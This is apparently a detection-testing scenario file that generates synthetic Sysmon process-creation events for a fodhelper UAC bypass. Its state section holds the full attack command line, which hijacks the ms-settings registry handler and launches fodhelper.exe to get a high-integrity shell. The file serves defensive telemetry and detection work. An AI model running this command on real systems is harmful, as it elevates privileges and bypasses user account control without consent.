@@ -1,0 +1,275 @@
+type: scenario
+description: |
+  A medium-integrity command shell hijacks the ms-settings protocol handler
+  and starts fodhelper.exe, which runs the planted command at high
+  integrity. Sysmon EID 1 (Process Create) records three linked processes:
+  cmd.exe at Medium integrity, started from PowerShell, running a command
+  that sets cmd.exe as the default value of
+  HKCU\Software\Classes\ms-settings\shell\open\command, adds an empty
+  DelegateExecute value there and launches fodhelper.exe; fodhelper.exe, an
+  auto-elevating Windows binary, created by that shell at High integrity;
+  and cmd.exe created by fodhelper.exe at High integrity. Windows starts
+  fodhelper.exe elevated without a prompt only for a member of the local
+  Administrators group under a UAC level below Always notify.
+tags: [eid1]
+mitre:
+  tactics: [privilege-escalation, defense-evasion]
+  techniques: [T1548.002]
+
+state:
+  domain_short:            CORP
+  domain_tld:              local
+  domain_short_lower:      fn.lower(ref.domain_short)
+  domain_fqdn:             "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:                gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  sysmon_pid:              gen.int(min=1000, max=4000)
+  sysmon_tid:              gen.int(min=1000, max=9999)
+  username:                gen.username()
+  user:                    "${ref.domain_short}\\${ref.username}"
+  # The shell runs on the filtered medium token; the elevated processes on the
+  # linked full token, which has its own logon session.
+  filtered_logon_guid_raw: fn.upper(gen.uuid())
+  filtered_logon_guid:     "{${ref.filtered_logon_guid_raw}}"
+  filtered_logon_id_hex:   gen.hex(len=5, case=lower)
+  filtered_logon_id:       "0x${ref.filtered_logon_id_hex}"
+  elevated_logon_guid_raw: fn.upper(gen.uuid())
+  elevated_logon_guid:     "{${ref.elevated_logon_guid_raw}}"
+  elevated_logon_id_hex:   gen.hex(len=5, case=lower)
+  elevated_logon_id:       "0x${ref.elevated_logon_id_hex}"
+  host_guid_raw:           fn.upper(gen.uuid())
+  host_process_guid:       "{${ref.host_guid_raw}}"
+  host_process_id:         gen.int(min=1000, max=9999)
+  shell_guid_raw:          fn.upper(gen.uuid())
+  shell_process_guid:      "{${ref.shell_guid_raw}}"
+  shell_process_id:        gen.int(min=1000, max=9999)
+  fodhelper_guid_raw:      fn.upper(gen.uuid())
+  fodhelper_process_guid:  "{${ref.fodhelper_guid_raw}}"
+  fodhelper_process_id:    gen.int(min=1000, max=9999)
+  process_guid_raw:        fn.upper(gen.uuid())
+  process_guid:            "{${ref.process_guid_raw}}"
+  process_id:              gen.int(min=1000, max=9999)
+  shell_record_id:         gen.int(min=5000, max=3299999)
+  fodhelper_record_id:     gen.int(min=3300000, max=6599999)
+  process_record_id:       gen.int(min=6600000, max=9999999)
+  shell_command_line:      '"cmd.exe" /c reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f & reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f & fodhelper.exe'
+  fodhelper_command_line:  '"C:\Windows\system32\fodhelper.exe" '
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.shell_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.shell_process_guid
+            - "@Name": ProcessId
+              "#text": ref.shell_process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\cmd.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.17134.1 (WinBuild.160101.0800)"
+            - "@Name": Description
+              "#text": Windows Command Processor
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": Cmd.Exe
+            - "@Name": CommandLine
+              "#text": ref.shell_command_line
+            - "@Name": CurrentDirectory
+              "#text": "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.filtered_logon_guid
+            - "@Name": LogonId
+              "#text": ref.filtered_logon_id
+            - "@Name": TerminalSessionId
+              "#text": 1
+            - "@Name": IntegrityLevel
+              "#text": Medium
+            - "@Name": Hashes
+              "#text": "SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE"
+            - "@Name": ParentProcessGuid
+              "#text": ref.host_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.host_process_id
+            - "@Name": ParentImage
+              "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            - "@Name": ParentCommandLine
+              "#text": '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" '
+            - "@Name": ParentUser
+              "#text": ref.user
+
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.fodhelper_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.fodhelper_process_guid
+            - "@Name": ProcessId
+              "#text": ref.fodhelper_process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\fodhelper.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.17134.1 (WinBuild.160101.0800)"
+            - "@Name": Description
+              "#text": Features On Demand Helper
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": FodHelper.EXE
+            - "@Name": CommandLine
+              "#text": ref.fodhelper_command_line
+            - "@Name": CurrentDirectory
+              "#text": "C:\\Windows\\system32\\"
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.elevated_logon_guid
+            - "@Name": LogonId
+              "#text": ref.elevated_logon_id
+            - "@Name": TerminalSessionId
+              "#text": 1
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": "SHA1=84C1DE94E002DE58009973F5DD16241D286201A5,MD5=1D1F9E564472A9698F1BE3F9FEB9864B,SHA256=B52FBB99308493A27AAC725CF70721041CDEE61CACA19792B949CC0867A27964,IMPHASH=9B87653B0F199E556A5CCF9C623D328F"
+            - "@Name": ParentProcessGuid
+              "#text": ref.shell_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.shell_process_id
+            - "@Name": ParentImage
+              "#text": "C:\\Windows\\System32\\cmd.exe"
+            - "@Name": ParentCommandLine
+              "#text": ref.shell_command_line
+            - "@Name": ParentUser
+              "#text": ref.user
+
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.process_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\cmd.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.17134.1 (WinBuild.160101.0800)"
+            - "@Name": Description
+              "#text": Windows Command Processor
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": Cmd.Exe
+            - "@Name": CommandLine
+              "#text": '"C:\Windows\System32\cmd.exe" '
+            - "@Name": CurrentDirectory
+              "#text": "C:\\Windows\\system32\\"
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.elevated_logon_guid
+            - "@Name": LogonId
+              "#text": ref.elevated_logon_id
+            - "@Name": TerminalSessionId
+              "#text": 1
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": "SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE"
+            - "@Name": ParentProcessGuid
+              "#text": ref.fodhelper_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.fodhelper_process_id
+            - "@Name": ParentImage
+              "#text": "C:\\Windows\\System32\\fodhelper.exe"
+            - "@Name": ParentCommandLine
+              "#text": ref.fodhelper_command_line
+            - "@Name": ParentUser
+              "#text": ref.user
